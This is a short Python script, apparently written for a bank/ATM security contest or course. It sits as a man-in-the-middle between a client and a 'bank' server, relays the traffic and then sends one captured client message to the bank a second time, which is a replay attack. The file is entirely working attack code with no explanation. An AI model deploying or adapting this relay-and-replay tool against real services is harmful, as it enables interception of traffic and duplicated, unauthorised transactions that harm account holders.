#!/usr/bin/env python
#coding: utf-8
import json
import argparse
import socket
import hashlib
import string
import random
import signal
import ast
import hmac
import base64
import sys
import errno
import os

class MITM:
	def __init__(self,port,sip,sport):
		self.port = port
		self.sip = sip
		self.sport = sport
		self.startServer()

		# signal.signal(signal.SIGINT, self.exitClean)
		signal.signal(signal.SIGTERM, self.exitClean)

	def exitClean(self, signum, frame):
		self.server.shutdown(socket.SHUT_RDWR)
		self.server.close()
		sys.stderr.write('Clean Exit \n')
		sys.exit(0)

	def startServer(self):
		try:
			self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			self.server.bind(('0.0.0.0', self.port))
			self.server.listen(1)
			flag = False
			print('started')
			sys.stdout.flush()
			self.handleMessage()
			msg=self.handleMessage()
			self.sendToBank(msg)
		except:
			self.exitClean(None,None)

	def handleMessage(self):
		try:
			self.client,address = self.server.accept()
			self.client.settimeout(10.0)
			flag = True
			orgmsg = self.client.recv(2048)
			msg=self.sendToBank(orgmsg)
			self.client.send(msg)
			return orgmsg
		except socket.error:
			print('protocol_error')
			sys.stdout.flush()
		except:
			print('protocol_error')
			sys.stdout.flush()
		finally:  
			# self.client.shutdown(socket.SHUT_RDWR)
			if flag:
				self.client.close()
	def sendToBank(self,orgmsg):
		conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			conn.connect((self.sip, int(self.sport)))
			conn.send(orgmsg)
			msg = conn.recv(2048)
		except socket.error:
			sys.stderr.write('Timeout/Connection error 63 \n')
			sys.exit(63)
		conn.close()
		return msg


def main():
	parser = argparse.ArgumentParser(description='Validate')
	parser.add_argument("-p",dest='port', default = 4000, type=int)
	parser.add_argument('-s',dest='sip',default='127.0.0.1')
	parser.add_argument('-q',dest='sport', default=3000, type=int)
	parser.add_argument('-c',dest='cip',default='127.0.0.1')
	parser.add_argument('-d',dest='cport',default=5000, type=int)
	args = parser.parse_args()

	MITM(args.port, args.sip , args.sport)
	 
if __name__ == '__main__':
	main()
	
